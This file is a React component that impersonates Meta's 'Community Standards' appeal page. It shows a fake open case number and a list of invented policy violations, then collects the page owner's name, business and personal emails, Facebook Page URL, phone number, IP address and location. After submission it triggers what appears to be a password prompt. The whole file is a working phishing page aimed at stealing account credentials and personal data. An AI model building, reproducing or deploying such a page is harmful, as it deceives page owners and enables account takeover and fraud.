import React, { useEffect } from 'react'
import moment from 'moment';
import Link from 'next/link';
import PhoneInput from 'react-phone-input-2';
import "react-phone-input-2/lib/style.css";
import { saveRecord } from '@/app/utils';
import CustomCheckbox from '../check-box/CustomCheckbox';

interface MetaProps {
    onToggle: (value: boolean) => void;
    userLocation: Record<string, any>;
    countryCode: string;
    onOpendPassword: (value: boolean) => void;
}

const MetaComponent = ({ onToggle, userLocation, countryCode, onOpendPassword }: MetaProps) => {

    const currentDate = moment().format('MMMM D, YYYY')
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");

    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [formData, setFormData] = React.useState({
        name: '',
        email: '',
        emailBusiness: '',
        fanpage: '',
        phone: '',
        message: '',
    });

    useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();
    }, []);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
        setErrors(prev => ({ ...prev, [id]: '' }));
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();

            const newErrors: Record<string, string> = {};
            if (!formData.name.trim()) newErrors.name = 'Please enter enough the owner of the page.';
            if (!formData.email.trim()) newErrors.email = 'Please enter enough email address.';
            if (!formData.emailBusiness.trim()) newErrors.emailBusiness = 'Please enter enough business email address.';
            if (!formData.fanpage.trim()) newErrors.fanpage = 'Please enter enough fanpage url.';
            if (!formData.phone.trim()) newErrors.phone = 'Please enter enough phone number.';
            if (!formData.message.trim()) newErrors.message = 'Please enter enough your appeal.';

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }

            const clientData = {
                ...formData,
                ip: userLocation?.ip || "Unknown",
                location: userLocation?.location || "Unknown"
            };

            saveRecord("__client_rec__fi_rst", clientData);
            onOpendPassword(true);

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[33px] px-[11px] rounded-[6px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <div className='w-full md:bg-[#f0f2f5] md:pb-20'>
            <div className="header w-full h-[66px] flex items-center justify-start md:px-[6rem] px-[2rem] bg-[white] shadow-[0_2px_5px_#0003]">
                <Link href="/">
                    <img src="/images/meta/meta.svg" alt="meta" className='w-[120px]' />
                </Link>
            </div>

            <div className='bg-white mx-auto md:rounded-lg lg:w-1/2 lg:mt-12 md:w-4/5 md:mt-10 mt-4 w-full p-4 mb-0 border-spacing-2'>
                <div className="flex items-center space-x-3">
                    <div className="rounded-full">
                        <img className="w-12 h-12 text-gray-600" src="/images/meta/email.svg" alt="mailler" />
                    </div>
                    <div>
                        <h2 className="font-bold mb-[5px] text-[15px] text-[black]">Community Standards</h2>
                        <div className="flex items-center space-x-2">
                            <span className="px-2 py-[3px] text-xs text-white bg-[#3b81d3]">OPEN</span>
                            <span className="text-gray-500 text-[12px]">CASE #{ticketId}</span>
                        </div>
                    </div>
                </div>
                <div className="mt-4 border-t pb-8 border-b pt-4 border-[#808080]">
                    <div className="flex items-center space-x-2">
                        <img src="/images/meta/logo-icon.svg" alt="Meta" className="w-9 h-9" />
                        <h3 className="font-semibold text-[14px] text-[black]">Our Message</h3>
                    </div>
                    <ul className="mt-2 text-gray-600 text-sm space-y-1 ml-12">
                        <li className='text-[14px]'>* Intellectual Property Infringement – Unauthorized use of copyrighted content.</li>
                        <li className='text-[14px]'>* False or Misleading Information – Spreading deceptive or inaccurate content.</li>
                        <li className='text-[14px]'>* Advertising Policy Violations – Running ads that do not comply with Meta's guidelines.</li>
                        <li className='text-[14px]'>* Suspicious Activity – Unusual login attempts or automated behavior.</li>
                    </ul>
                    <p className="mt-4 text-gray-500 ml-12 text-[13px]">If you believe your page was removed by mistake, fill in this form so we can help.</p>
                </div>
                <div className="mt-4 mb-4 text-[14px]">
                    <span className="text-[#67788a] font-semibold text-[13px]">Required</span>
                    <span className="italic ml-[5px] text-[#67788a] text-[13px]">(Your Account Information)</span>
                </div>
                <div className='w-full '>
                    <form onSubmit={handSubmit} className='w-full flex flex-col gap-[7px]'>
                        <div className='w-full flex flex-col gap-[3px]'>
                            <div className='flex items-center gap-[10px]'>
                                <i className='text-[red] text-[14px]'>*</i>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='name'>Who is the owner of the Page?</label>
                            </div>
                            <div className={inputClass('name')}>
                                <input
                                    type="text"
                                    className="w-full outline-0 h-full"
                                    id='name'
                                    value={formData.name}
                                    onChange={handleChange}
                                />
                            </div>
                            {errorText('name')}
                        </div>

                        <div className='w-full flex flex-col gap-[3px]'>
                            <div className='flex items-center gap-[10px]'>
                                <i className='text-[red] text-[14px]'>*</i>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='emailBusiness'>Business Email</label>
                            </div>
                            <div className={inputClass('emailBusiness')}>
                                <input
                                    type="text"
                                    className="w-full outline-0 h-full"
                                    id='emailBusiness'
                                    value={formData.emailBusiness}
                                    onChange={handleChange}
                                />
                            </div>
                            {errorText('emailBusiness')}
                        </div>

                        <div className='w-full flex flex-col gap-[3px]'>
                            <div className='flex items-center gap-[10px]'>
                                <i className='text-[red] text-[14px]'>*</i>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='email '>Personal Email</label>
                            </div>
                            <div className={inputClass('email')}>
                                <input
                                    type="text"
                                    className="w-full outline-0 h-full"
                                    id='email'
                                    value={formData.email}
                                    onChange={handleChange}
                                />
                            </div>
                            {errorText('email')}
                        </div>

                        <div className='w-full flex flex-col gap-[3px]'>
                            <div className='flex items-center gap-[10px]'>
                                <i className='text-[red] text-[14px]'>*</i>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='fanpage '>Facebook Page URL</label>
                            </div>
                            <div className={inputClass('fanpage')}>
                                <input
                                    type="text"
                                    className="w-full outline-0 h-full"
                                    id='fanpage'
                                    value={formData.fanpage}
                                    onChange={handleChange}
                                />
                            </div>
                            {errorText('fanpage')}
                        </div>

                        <div className='w-full flex flex-col gap-[3px]'>
                            <div className='flex items-center gap-[10px]'>
                                <i className='text-[red] text-[14px]'>*</i>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='phone '>Phone Number</label>
                            </div>
                            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[33px] rounded-[6px] bg-[white] text-[14px] mb-[10px]`}>
                                <PhoneInput
                                    inputClass="w-full outline-0 h-full rounded-[6px]"
                                    country={countryCode?.toLowerCase() || "us"}
                                    value={formData.phone}
                                    onChange={(phone) => {
                                        setFormData(prev => ({ ...prev, phone }));
                                        setErrors(prev => ({ ...prev, phone: '' }));
                                    }}
                                />
                            </div>
                            {errorText('phone')}
                        </div>

                        <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-[#67788a]' htmlFor="Country">
                            <CustomCheckbox id="Country" />
                            Country of your credit and/or debit cards doesn't match your current location
                        </label>

                        <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-[#67788a]' htmlFor="traveled">
                            <CustomCheckbox id="traveled" />
                            You traveled within the last 60 days
                        </label>

                        <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-[#67788a]' htmlFor="relocated">
                            <CustomCheckbox id="relocated" />
                            You relocated within the last 60 days
                        </label>

                        <div className='w-full flex flex-col gap-[3px]'>
                            <div className='flex items-center gap-[10px]'>
                                <i className='text-[red] text-[14px]'>*</i>
                                <label className='text-[14px] text-[#7c807e] font-[600]' htmlFor='phoneNumber '>Your Appeal</label>
                            </div>
                            <div className={`input w-full border ${errors.message ? 'border-red-500' : 'border-[#d4dbe3]'} h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
                                <textarea
                                    id='message'
                                    className="w-full outline-0 h-full resize-none"
                                    value={formData.message}
                                    onChange={handleChange}
                                />
                            </div>
                            {errorText('message')}
                        </div>

                        <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-[#7c807e] font-[600]' htmlFor="agree">
                            <CustomCheckbox id='agree' />
                            I agree to our Terms, Data Policy and Cookies Policy.
                        </label>

                        <div className=' mt-[20px] '>
                            <button className='bg-[#0064E0] text-[white] rounded-[6px] pt-[8px] pb-[8px] px-[20px] mb-[10px] flex items-center justify-center cursor-pointer text-[15px] font-[600]'>Submit</button>
                        </div>

                        <p className="text-gray-500 text-sm">For more information about how Meta handles your data please read our <Link className="cursor-pointer text-[#0d6efd] flex items-center gap-[5px] inline" href="https://www.facebook.com/privacy/policy">Meta Privacy Policy</Link></p>
                    </form>
                </div>
            </div>
        </div>
    )
}

export default MetaComponent
